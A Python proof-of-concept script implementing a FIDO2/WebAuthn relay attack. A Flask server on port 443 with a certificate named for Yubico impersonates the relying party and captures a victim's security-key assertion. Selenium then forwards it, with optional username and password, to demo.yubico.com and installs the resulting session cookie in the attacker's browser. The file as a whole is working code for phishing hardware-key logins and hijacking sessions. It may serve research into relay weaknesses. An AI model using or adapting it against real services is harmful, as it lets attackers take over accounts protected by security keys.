import os, time, json, base64, threading, sys
from dataclasses import dataclass, field
from typing import List, Optional
from fido2.utils import _CamelCaseDataObject
from fido2 import cbor
from fido2.server import Fido2Server, PublicKeyCredentialRequestOptions, PublicKeyCredentialDescriptor
from fido2.webauthn import PublicKeyCredentialRpEntity
from flask import Flask, abort, jsonify, render_template, request, session, redirect
from selenium import webdriver
from seleniumrequests import Firefox
from seleniumrequests.request import RequestsSessionMixin
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

app = Flask(__name__)
app.secret_key = os.urandom(32)
_rp = PublicKeyCredentialRpEntity(name="Demo app")
_server = Fido2Server(_rp)
browser_options = webdriver.FirefoxOptions()
useragent = "Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 XL Build/OPD1.170816.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36"
browser_options.set_preference("general.useragent.override", useragent)
browser_options.set_preference("dom.webnotifications.serviceworker.enabled", False)
browser_options.set_preference("dom.webnotifications.enabled", False)
global assertion, auth_data
assertion = None
auth_data = None

class MyCustomWebDriver(Firefox,RequestsSessionMixin):
    pass
browser = MyCustomWebDriver(options=browser_options)

@dataclass(eq=False, frozen=True)
class CredentialRequestOptions(_CamelCaseDataObject):
    public_key: PublicKeyCredentialRequestOptions

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/authenticate", methods=["POST"])
def authenticate():
    if auth_data != None:
        #print(auth_data)
        return cbor.encode(CredentialRequestOptions(auth_data))
    else:
        return cbor.encode({"status": "ERROR"})

@app.route("/api/authenticate/forward", methods=["POST"])
def authenticate_forward():
    data = cbor.decode(request.get_data())
    data["clientDataJSON"] = base64.urlsafe_b64encode(data["clientDataJSON"]).decode()
    data["credentialId"] = base64.b64encode(data["credentialId"]).decode()
    data["authenticatorData"] = base64.b64encode(data["authenticatorData"]).decode()
    data["signature"] = base64.b64encode(data["signature"]).decode()
    if "userHandle" in data.keys():
        data["userHandle"] = base64.b64encode(data["userHandle"]).decode()

    global assertion
    assertion = data

    return cbor.encode({"status": "OK"})


def main():   
    browser.get('https://demo.yubico.com/playground')
    time.sleep(2)

    begin_data = {}
    begin_data["namespace"] = "playground"

    #if login needs username, password, and FIDO2
    if len(sys.argv) > 2:
        creds = {
            "username":sys.argv[1],
            "password":sys.argv[2],
            "namespace":"playground"
        }
        response = browser.request('POST', 'https://demo.yubico.com/api/v1/auth/login', json=creds)
        auth_resp = response.json()
        uuid = auth_resp['data']['user']['uuid']
        auth_cookie = response.cookies.get('demo_website_session')
        browser.add_cookie({"name":"demo_website_session", "value": auth_cookie})
        begin_data["uuid"] = uuid

    #continue with FIDO2 auth
    response = browser.request('POST', 'https://demo.yubico.com/api/v1/auth/webauthn/authenticate-begin', json=begin_data)
    begin_resp = response.json()
    #print(begin_resp)
    req_id = begin_resp['data']['requestId']
    cred_ids = begin_resp['data']['publicKey']['allowCredentials']
    challenge = begin_resp['data']['publicKey']['challenge']
    rpId = begin_resp['data']['publicKey']['rpId']
    userVerification = begin_resp['data']['publicKey']['userVerification']
    timeout = begin_resp['data']['publicKey']['timeout']
    print("[*] rpId:       {0}".format(rpId))
    print("[*] challenge:  {0}".format(challenge))
    print("[*] cred_ids:   {0}".format(cred_ids))
    print("[*] timeout:    {0}".format(timeout))
    l = []
    for cred_id in cred_ids:
        l.append(PublicKeyCredentialDescriptor(type=cred_id["type"], id=base64.b64decode(cred_id["id"])))
    global auth_data
    auth_data = PublicKeyCredentialRequestOptions(
        base64.b64decode(challenge),
        timeout,
        rpId,
        l,
        userVerification)


    #get data from yubikey, reauth if timeout reached 
    c = 0
    while assertion == None:
        time.sleep(0.5)
        c += 500
        if c > timeout:
            main()

    final_data = {
        "requestId": req_id,
        "assertion": assertion,
        "namespace": "playground"
    }
    if "uuid" in begin_data.keys():
        final_data["uuid"] = begin_data["uuid"]


    #send yubikey data
    response = browser.request('POST', 'https://demo.yubico.com/api/v1/auth/webauthn/authenticate-finish', json=final_data)
    final_resp = response.json()
    if final_resp['status'] == 'success':
        print("[+] Success!")
        auth_cookie = response.cookies.get('demo_website_session')
        browser.delete_cookie("demo_website_session")
        browser.add_cookie({"name":"demo_website_session", "value": auth_cookie})

        browser.get('https://demo.yubico.com/playground')

        while True:
            try:
                time.sleep(1)
            except KeyboardInterrupt:
                break
    else:
        print(final_resp)
    
    browser.quit()

if __name__ == "__main__":
    #start fido server in background
    dir = os.path.dirname(sys.argv[0])
    thread = threading.Thread(target=lambda: app.run(host="0.0.0.0",port=443, ssl_context=(dir+'/yubico.pem', dir+'/yubico-key.pem'), debug=False, use_reloader=False))
    thread.daemon = True
    thread.start()
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        sys.exit()
